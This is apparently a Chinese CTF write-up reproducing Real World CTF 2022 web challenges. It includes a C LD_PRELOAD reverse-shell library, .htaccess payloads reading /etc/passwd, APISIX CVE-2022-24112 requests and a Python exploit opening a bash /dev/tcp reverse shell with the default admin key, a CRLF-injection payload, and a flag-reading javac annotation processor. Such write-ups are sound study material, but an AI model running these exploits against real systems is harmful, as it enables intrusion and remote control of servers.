---
title: Rwctf 2022
slug: rwctf-2022
description: ""
summary: ""
date: 2026-07-31T15:33:44+08:00
lastmod: 2026-07-31T15:33:44+08:00
author: baozongwi
image: ""
categories:
  - 复现
tags: []
keywords: []
---
## Hack-into-Skynet

```python
#!/usr/bin/env python3

import flask
import psycopg2
import datetime
import hashlib
from skynet import Skynet

app = flask.Flask(__name__, static_url_path='')
skynet = Skynet()

def skynet_detect():
    req = {
        'method': flask.request.method,
        'path': flask.request.full_path,
        'host': flask.request.headers.get('host'),
        'content_type': flask.request.headers.get('content-type'),
        'useragent': flask.request.headers.get('user-agent'),
        'referer': flask.request.headers.get('referer'),
        'cookie': flask.request.headers.get('cookie'),
        'body': str(flask.request.get_data()),
    }
    _, result = skynet.classify(req)
    return result and result['attack']

@app.route('/static/<path:path>')
def static_files(path):
    return flask.send_from_directory('static', path)

@app.route('/', methods=['GET', 'POST'])
def do_query():
    if skynet_detect():
        return flask.abort(403)

    if not query_login_state():
        response = flask.make_response('No login, redirecting', 302)
        response.location = flask.escape('/login')
        return response

    if flask.request.method == 'GET':
        return flask.send_from_directory('', 'index.html')
    elif flask.request.method == 'POST':
        kt = query_kill_time()
        if kt:
            result = kt 
        else:
            result = ''
        return flask.render_template('index.html', result=result)
    else:
        return flask.abort(400)

@app.route('/login', methods=['GET', 'POST'])
def do_login():
    if skynet_detect():
        return flask.abort(403)

    if flask.request.method == 'GET':
        return flask.send_from_directory('static', 'login.html')
    elif flask.request.method == 'POST':
        if not query_login_attempt():
            return flask.send_from_directory('static', 'login.html')
        else:
            session = create_session()
            response = flask.make_response('Login success', 302)
            response.set_cookie('SessionId', session)
            response.location = flask.escape('/')
            return response
    else:
        return flask.abort(400)

def query_login_state():
    sid = flask.request.cookies.get('SessionId', '')
    if not sid:
        return False

    now = datetime.datetime.now()
    with psycopg2.connect(
            host="challenge-db",
            database="ctf",
            user="ctf",
            password="ctf") as conn:
        cursor = conn.cursor()
        cursor.execute("SELECT sessionid"
           "  FROM login_session"
           "  WHERE sessionid = %s"
           "    AND valid_since <= %s"
           "    AND valid_until >= %s"
           "", (sid, now, now))
        data = [r for r in cursor.fetchall()]
        return bool(data)

def query_login_attempt():
    username = flask.request.form.get('username', '')
    password = flask.request.form.get('password', '')
    if not username and not password:
        return False

    sql = ("SELECT id, account"
           "  FROM target_credentials"
           "  WHERE password = '{}'").format(hashlib.md5(password.encode()).hexdigest())
    user = sql_exec(sql)
    name = user[0][1] if user and user[0] and user[0][1] else ''
    return name == username

def create_session():
    valid_since = datetime.datetime.now()
    valid_until = datetime.datetime.now() + datetime.timedelta(days=1)
    sessionid = hashlib.md5((str(valid_since)+str(valid_until)+str(datetime.datetime.now())).encode()).hexdigest()

    sql_exec_update(("INSERT INTO login_session (sessionid, valid_since, valid_until)"
           "  VALUES ('{}', '{}', '{}')").format(sessionid, valid_since, valid_until))
    return sessionid

def query_kill_time():
    name = flask.request.form.get('name', '')
    if not name:
        return None

    sql = ("SELECT name, born"
           "  FROM target"
           "  WHERE age > 0"
           "    AND name = '{}'").format(name)
    nb = sql_exec(sql)
    if not nb:
        return None
    return '{}: {}'.format(*nb[0])

def sql_exec(stmt):
    data = list()
    try:
        with psycopg2.connect(
                host="challenge-db",
                database="ctf",
                user="ctf",
                password="ctf") as conn:
            cursor = conn.cursor()
            cursor.execute(stmt)
            for row in cursor.fetchall():
                data.append([col for col in row])
            cursor.close()
    except Exception as e:
        print(e)
    return data

def sql_exec_update(stmt):
    data = list()
    try:
        with psycopg2.connect(
                host="challenge-db",
                database="ctf",
                user="ctf",
                password="ctf") as conn:
            cursor = conn.cursor()
            cursor.execute(stmt)
            conn.commit()
    except Exception as e:
        print(e)
    return data

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=8080)

```

skynet_detect 有个 WAF，直接利用 HTTP 协议的 `multipart/form-data` 数据格式绕过，有解析差异

![](assets/001.png)
没用占位符，可以 sql 注入，闭合正常注入就可以了

## RWDN

这里就是一个双文件上传，即可绕过上传 .htaccess 文件，而且 .htaccess 文件的话可以用来进行任意文件读取，这个打 XCTF 的时候我们是知道的，可能就是从 RWCTF 里面流传下来的一个特性，
```conf
ErrorDocument 404 "%{file:/etc/passwd}"
```

只要这么写，报错页 404 就是 passwd 的内容，
```http
POST /upload?formid=form-636080e5-e589-433d-9fa5-2e8ec0f5ba132 HTTP/1.1
Host: 127.0.0.1:8000
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36
Accept: */*
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryG9WWWEEOTX4T6bTg
Content-Length: 478

------WebKitFormBoundaryG9WWWEEOTX4T6bTg
Content-Disposition: form-data; name="form-636080e5-e589-433d-9fa5-2e8ec0f5ba132"; filename="2.txt"
Content-Type: application/octet-stream

<?php phpinfo();?>
------WebKitFormBoundaryG9WWWEEOTX4T6bTg
Content-Disposition: form-data; name="form-636080e5-e589-433d-9fa5-2e8ec0f5ba13"; filename=".htaccess"
Content-Type: application/octet-stream

ErrorDocument 404 "%{file:/etc/apache2/apache2.conf}"
------WebKitFormBoundaryG9WWWEEOTX4T6bTg--
```

读取到 apache 配置文件为
```conf
# Include of directories ignores editors' and dpkg's backup files,  
# see README.Debian for details.  
ExtFilterDefine 7f39f8317fgzip mode=output cmd=/bin/gzip  
  
# Include generic snippets of statements  
IncludeOptional conf-enabled/*.conf  
  
# Include the virtual host configurations:  
IncludeOptional sites-enabled/*.conf
```

`ExtFilterDefine 7f39f8317fgzip mode=output cmd=/bin/gzip` 启用并定义了 Apache 的 `mod_ext_filter` 模块过滤器。

`mod_ext_filter` 可以将 HTTP 响应体交由外部系统命令（此处为 `/bin/gzip`）处理。这意味着每次触发该过滤器时，Apache 都会通过 `fork()` 和 `execve()` 派生（Spawn）一个新的操作系统子进程。所以我们劫持环境变量即可 RCE

```
SetEnv LD_PRELOAD "/var/www/html/xxx/1.so"
SetOutputFilter 7f39f8317fgzip
```


```c
#define _GNU_SOURCE
#include <unistd.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define LHOST "x.x.x.x"
#define LPORT 4444

__attribute__((constructor))
static void revshell(void)
{
    struct sockaddr_in sa;
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0)
        return;

    sa.sin_family = AF_INET;
    sa.sin_port = htons(LPORT);
    sa.sin_addr.s_addr = inet_addr(LHOST);

    if (connect(fd, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
        close(fd);
        return;
    }

    switch (fork()) {
    case -1:
        close(fd);
        return;
    case 0:  /* 子进程：脱终端 + 重定向 + 起 shell */
        setsid();
        dup2(fd, 0);
        dup2(fd, 1);
        dup2(fd, 2);
        close(fd);
        execl("/bin/sh", "sh", NULL);
        _exit(0);
    default: /* 父进程（gzip）立即退出，HTTP 响应不挂起 */
        close(fd);
        _exit(0);
    }
}

//gcc -shared -fPIC -o 1.so 1.c
```

## API6

由于年久失修，改一下拉取的镜像即可启动

```yaml
version: "3.9"
services:
  etcd:
    image: "bitnamilegacy/etcd"
    expose:
      - "2379"
    environment:
      ALLOW_NONE_AUTHENTICATION: "yes"

  apisix:
    image: "apache/apisix:2.10.0-centos"
    ports:
      - "9080"
    volumes:
      - "./conf/config.yaml:/usr/local/apisix/conf/config.yaml"
      - "./flag.txt:/flag"
    deploy:
      restart_policy:
        condition: on-failure
        delay: 1s
        max_attempts: 5
```

查看题目提供的 config.yaml

```yaml
#
# Licensed to the Apache Software Foundation (ASF) under one or more
# contributor license agreements.  See the NOTICE file distributed with
# this work for additional information regarding copyright ownership.
# The ASF licenses this file to You under the Apache License, Version 2.0
# (the "License"); you may not use this file except in compliance with
# the License.  You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#
# If you want to set the specified configuration value, you can set the new
# in this file. For example if you want to specify the etcd address:
#
# etcd:
#     host:
#       - http://127.0.0.1:2379
#
# To configure via environment variables, you can use `${{VAR}}` syntax. For instance:
#
# etcd:
#     host:
#       - http://${{ETCD_HOST}}:2379
#
# And then run `export ETCD_HOST=$your_host` before `make init`.
#
# If the configured environment variable can't be found, an error will be thrown.
apisix:
  admin_key:
    - name: admin
      key: edd1c9f034335f136f87ad84b625c8f1  # using fixed API token has security risk, please update it when you deploy to production environment
      role: admin

etcd:
  host:
    - http://etcd:2379

```

是标准的 APISIX 2.x 配置,admin key 用的默认值 `edd1c9f034335f136f87ad84b625c8f1`,没有改。整体就是一个裸的 APISIX 网关,入口只有 9080 一个端口,目标是 RCE。

### 分析

先看表面。直接访问 `/apisix/admin/*` 返回 403,nginx 配置里 admin location 做了 `allow 127.0.0.0/24; deny all;`,外部 IP 进不来。admin API 才是真正能改路由的地方,所以第一步是绕过这个 IP 限制。

突破口是 batch-requests 插件。这个插件允许在 POST /apisix/batch-requests 的 body 里带一个 pipeline 数组,每个子请求会被 APISIX 自己转发处理。转发是用 cosocket 直连本机端口,插件源码里就是这么写的:

```lua
local httpc = http.new()
httpc:set_timeout(data.timeout)
local ok, err = httpc:connect("127.0.0.1", ngx.var.server_port)
```

子请求从 APISIX 进程自己发出去,对端 IP 就是 127.0.0.1,天然满足 admin 的 IP 白名单。也就是说只要能把请求送进 batch-requests,就能以本地身份访问 admin API。CVE-2022-24112 描述的正是这件事，2.12.1 之前,插件对子请求头里的 X-Real-IP 处理有个大小写 bug,攻击者直接伪造 `X-Real-IP: 127.0.0.1` 就能把真实客户端 IP 盖掉,从而通过后面 realip 模块的检查。官方修复就是 set_common_header 里的两行:

```diff
+    -- we don't need to handle '_' to '-' as Nginx won't treat 'X_REAL_IP' as 'X-Real-IP'
+    real_ip_hdr = str_lower(real_ip_hdr)
```

把 real_ip_header 配置(通常是 "X-Real-IP")统一转成小写,再去覆盖子请求里的小写键,伪造的假 IP 就被真实的替换掉了。2.12.1 和 2.13.0 的 batch-requests.lua 逐字节一致,修复到此为止。

但这条修复管不到另一个面。子请求的 path 参数在拼进实际请求行时没有任何过滤,resty.http 的 `_format_request` 是直接原样拼接的:

```lua
local req = {
    str_upper(params.method),
    " ",
    self.path_prefix or "",
    params.path,
    query,
    HTTP[version],
    true,
    true,
    true,
}
```

path 里塞 `\r\n` 就能在 cosocket 发出的字节流里注入任意请求头和 body。官方 CVE 描述里没提这条,2.13.0 到现在也没给 batch-requests 加 CRLF 校验。所以即使 X-Real-IP 那条被修了,用 CRLF 注入伪造一个带 `X-API-KEY` 和任意头的内部请求照样能访问 admin API。

拿到 admin API 之后怎么执行命令,有两条路,两条我都通了。

第一条是 route 的 `script` 字段。APISIX 2.x 的 admin API 在创建路由的时候就会校验并执行这段 Lua,校验逻辑在 apisix/admin/routes.lua:

```lua
if conf.script then
    local obj, err = loadstring(conf.script)
    if not obj then
        return nil, {error_msg = "failed to load 'script' string: "
                                     .. err}
    end

    if type(obj()) ~= "table" then
        return nil, {error_msg = "'script' should be a Lua object"}
    end
end
```

loadstring 编译完之后立刻 `obj()` 执行,命令在 admin 进程里跑完,之后才轮到 `type(obj())` 检查返回值。只要 script 没有 return,这里就会抛 `bad argument #1 to 'type' (value expected)`,admin 返回 500。但 io.popen 已经执行完了,500 只是吞掉了 ngx.say 的回显。

第二条是 route 的 `filter_func` 字段。它和 script 不同,校验时做的是 `loadstring("return " .. conf.filter_func)`,要求编译结果是一个函数,真正执行发生在路由匹配阶段，请求打过来命中这条路由时 `filter_func(vars)` 被调用,os.execute 在里面跑。

### 测试

用 filter_func 变体在本地 2.10.0 上走一遍。先起监听:`nc -lvnp 4444`。然后发给 batch-requests 的完整请求是这样的:

```http
POST /apisix/batch-requests HTTP/1.1
Host: 127.0.0.1:56230
Content-Type: application/json

{"headers":{"X-Real-IP":"127.0.0.1","X-API-KEY":"edd1c9f034335f136f87ad84b625c8f1"},"pipeline":[{"method":"PUT","path":"/apisix/admin/routes/666","body":"{\"uri\": \"/rms/24112\", \"methods\": [\"GET\"], \"upstream\": {\"type\": \"roundrobin\", \"nodes\": {\"127.0.0.1:1\": 1}}, \"filter_func\": \"function(vars) os.execute('bash -i >& /dev/tcp/host.docker.internal/4444 0>&1'); return true end\"}"}]}
```

子请求头里伪造了 X-Real-IP 和 X-API-KEY,2.10.0 没有 str_lower 修复,伪造直接生效。PUT 返回 200,路由落库。接着 GET /rms/24112 触发。

CRLF 变体的请求体长这样,path 字段里直接塞了一整个伪造的内部请求:

```json
{
  "headers": {"SICE": "me"},
  "timeout": 500,
  "pipeline": [{
    "method": "PUT",
    "path": "/apisix/admin/routes/1 HTTP/1.1\r\nHost: 127.0.0.1\r\nX-API-KEY: edd1c9f034335f136f87ad84b625c8f1\r\ncmd: cat /flag > /tmp/flag_pwned\r\nContent-Length: 175\r\n\r\n{\"methods\": [\"GET\"], \"uri\": \"/sice\", \"script\": \"local file = io.popen(ngx.req.get_headers()['cmd'], 'r') \\n local output = file:read('*a') \\n file:close() \\n ngx.say(output)\"}\r\n\r\n",
    "body": "test2"
  }]
}
```

Content-Length 175 是 payload JSON 的真实字节数,和 body 严格对齐。resty.http 把 path 拼进请求行后,cosocket 实际发到 127.0.0.1:9080 的字节流是:

```
PUT /apisix/admin/routes/1 HTTP/1.1
Host: 127.0.0.1
X-API-KEY: edd1c9f034335f136f87ad84b625c8f1
cmd: cat /flag > /tmp/flag_pwned
Content-Length: 175

{"methods": ["GET"], "uri": "/sice", "script": "local file = io.popen(ngx.req.get_headers()['cmd'], 'r') \n local output = file:read('*a') \n file:close() \n ngx.say(output)"}


 HTTP/1.1
Host: 127.0.0.1:9080
User-Agent: lua-resty-http/0.16.1 (Lua) ngx_lua/...
```

第一个请求被 admin 正常处理,script 在校验阶段执行`cat /flag`，但是最后的 ` HTTP/1.1` 这段残片被 nginx 当成 pipelined 请求解析,直接 400 关连接，resty.http 读不到第一个请求的响应，所以 batch 返回 504。

> 在 script 里 `\n` 在 JSON 文本中是两个字符的反斜杠转义,字节流里看到的是 `\\n`,解码成 Lua 字符串才是换行。

### exp

```python
#!/usr/bin/env python3
import base64
import json
import sys

import requests

HOST = "http://127.0.0.1:56230"
RHOST = "host.docker.internal"
RPORT = 4444
API_KEY = "edd1c9f034335f136f87ad84b625c8f1"
URI = "/rms/24112"
ROUTE_ID = 666

command = "bash -i >& /dev/tcp/%s/%s 0>&1" % (RHOST, RPORT)
encoded = base64.b64encode(command.encode("utf-8")).decode("ascii")

payload = {
    "uri": URI,
    "methods": ["GET"],
    "upstream": {"type": "roundrobin", "nodes": {"127.0.0.1:1": 1}},
    "filter_func": (
        "function(vars) os.execute(\"echo '%s' | base64 -d | bash\"); return true end"
        % encoded
    ),
}

body = {
    "headers": {"X-Real-IP": "127.0.0.1", "X-API-KEY": API_KEY},
    "pipeline": [
        {
            "method": "PUT",
            "path": "/apisix/admin/routes/%s" % ROUTE_ID,
            "body": json.dumps(payload),
        }
    ],
}

api = HOST.rstrip("/")
resp = requests.post(api + "/apisix/batch-requests", json=body, timeout=10)
if resp.status_code != 200:
    sys.exit("deploy failed: %s %s" % (resp.status_code, resp.text[:300]))
requests.get(api + URI, timeout=10)

# python3 exp.py
```

![](assets/002.png)

## Secured Java

```python
#!/usr/bin/env python
import os
import base64
import tempfile
import subprocess

SOURCE_FILE = "Main.java"
DEP_FILE = "dep.jar"


def get_file(filename: str):
    print(f"Please send me the file {filename}.")
    content = input("Content: (base64 encoded)")
    data = base64.b64decode(content)
    if len(data) > 1024 * 1024:
        raise ValueError("Too long")
    with open(filename, "wb") as fp:
        fp.write(data)


def main():
    print("Welcome to the secured Java sandbox.")
    with tempfile.TemporaryDirectory() as dir:
        os.chdir(dir)
        get_file("Main.java")
        get_file("dep.jar")
        print("Compiling...")
        try:
            subprocess.run(
                ["javac", "-cp", DEP_FILE, SOURCE_FILE],
                input=b"",
                check=True,
            )
        except subprocess.CalledProcessError:
            print("Failed to compile!")
            exit(1)

        print("Running...")
        try:
            subprocess.run(["java", "--version"])
            subprocess.run(
                [
                    "java",
                    "-cp",
                    f".:{DEP_FILE}",
                    "-Djava.security.manager",
                    "-Djava.security.policy==/dev/null",
                    "Main",
                ],
                check=True,
            )
        except subprocess.CalledProcessError:
            print("Failed to run!")
            exit(2)


if __name__ == "__main__":
    main()

```

可以提交 `Main.java` 和 `dep.jar` 两个文件，脚本先用 `javac -cp dep.jar Main.java` 编译，再用 `java` 运行。运行时`-Djava.security.manager` 开启了 SecurityManager，`-Djava.security.policy==/dev/null` 指定了策略文件。

Oracle 官方文档在 [Default Policy Implementation and Policy File Syntax](https://docs.oracle.com/en/java/javase/17/security/permissions-jdk1.html) 里明确写了
1. `-Djava.security.policy` 的值如果以 `=` 开头（即 `==path`），表示只使用这一个策略文件，跳过 `java.security` 里 `policy.url.n` 配置的所有默认策略
2. 如果是一个 `=`（即 `=path`），则是追加。

这里用 `==/dev/null`，意味着策略文件是 `/dev/null`——空文件，不授予任何 CodeSource 任何 Permission。运行时任何需要 SecurityManager 检查的操作（读文件、执行命令、反射等等）都会抛 `AccessControlException`。

验证一下确实是这样。提交一个尝试读 `/flag` 的 `Main.java`，运行时直接被拦：

```
Exception in thread "main" java.security.AccessControlException: access denied ("java.io.FilePermission" "/flag" "read")
    at java.base/java.security.AccessControlContext.checkPermission(AccessControlContext.java:485)
    at java.base/java.security.AccessController.checkPermission(AccessController.java:1068)
    at java.base/java.lang.SecurityManager.checkPermission(SecurityManager.java:416)
    ...
```

所以运行层基本没戏。但是脚本中编译和运行是分开的，编译命令是 `javac -cp dep.jar Main.java`，没有任何 SecurityManager 相关参数。

> `javac` 编译过程中能执行代码的机制，最典型的就是注解处理器（Annotation Processor）。这是 JSR 269（`javax.annotation.processing` 包）定义的标准 API，`javac` 在编译时会自动发现并运行 classpath 上的注解处理器。
> 这个行为在 `javac` 的官方文档里有说明：如果没有指定 `-processor` 选项，`javac` 会在 classpath（或 `-processorpath`，如果指定了的话）上通过 SPI 机制搜索 `META-INF/services/javax.annotation.processing.Processor` 文件，加载里面声明的处理器类。

题目里 `javac -cp dep.jar Main.java` 把 `dep.jar` 放在了 classpath 上，而且没有指定 `-processor` 或 `-processorpath`，所以 `dep.jar` 里的注解处理器会被自动发现和执行，这就够了，只要在 `dep.jar` 里塞一个注解处理器，在它的 `init` 方法里读 flag 文件并打印到 stdout 就行。

```java
import javax.annotation.processing.*;
import javax.lang.model.SourceVersion;
import javax.lang.model.element.*;
import java.nio.file.*;
import java.util.Set;

@SupportedAnnotationTypes("*")
@SupportedSourceVersion(SourceVersion.RELEASE_8)
public class FlagProcessor extends AbstractProcessor {

    @Override
    public synchronized void init(ProcessingEnvironment env) {
        super.init(env);
        try {
            System.out.println("FLAG:" + new String(Files.readAllBytes(Paths.get("/flag"))));
        } catch (Exception e) {
            System.out.println("FLAG:ERROR=" + e);
        }
    }

    @Override
    public boolean process(Set<? extends TypeElement> annotations, RoundEnvironment roundEnv) {
        return false;
    }
}
```

`Main.java` 不需要做任何事，编译通过就行：

```java
public class Main {
    public static void main(String[] args) {
    }
}
```

打包 `dep.jar` 时需要包含 `FlagProcessor.class` 和 `META-INF/services/javax.annotation.processing.Processor`（内容就一行：`FlagProcessor`）。

在临时的干净目录里面编译

```bash
mkdir -p /tmp/build/META-INF/services
javac -d /tmp/build FlagProcessor.java
echo "FlagProcessor" > /tmp/build/META-INF/services/javax.annotation.processing.Processor
cd /tmp/build && jar cf dep.jar .
```

exp 如下 

```python
#!/usr/bin/env python3
import base64
import os
import socket
import sys
import time

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 1337
DIR = os.path.dirname(os.path.abspath(__file__))


def recv_until(sock, pattern, timeout=15):
    sock.settimeout(timeout)
    buf = b""
    while pattern not in buf:
        try:
            chunk = sock.recv(4096)
            if not chunk:
                break
            buf += chunk
        except socket.timeout:
            break
    return buf


def send_file(sock, path):
    with open(path, "rb") as f:
        encoded = base64.b64encode(f.read()).decode()
    recv_until(sock, b"Content:")
    sock.sendall((encoded + "\n").encode())
    time.sleep(0.3)


def main():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((HOST, PORT))
    recv_until(sock, b"Main.java")
    send_file(sock, os.path.join(DIR, "Main.java"))
    recv_until(sock, b"dep.jar")
    send_file(sock, os.path.join(DIR, "dep.jar"))
    data = recv_until(sock, b"FLAG:", timeout=20)
    try:
        data += sock.recv(4096)
    except socket.timeout:
        pass
    sock.close()
    text = data.decode(errors="replace")
    for line in text.splitlines():
        if line.startswith("FLAG:"):
            print(line[5:].strip())
            return
    print(text)


if __name__ == "__main__":
    main()
    
# python3 exploit.py 127.0.0.1 1337
```

![](assets/003.png)

## Desperate Cat

这里用到内存马




> https://github.com/FightingLzn9/AgentMemshell/releases/tag/v1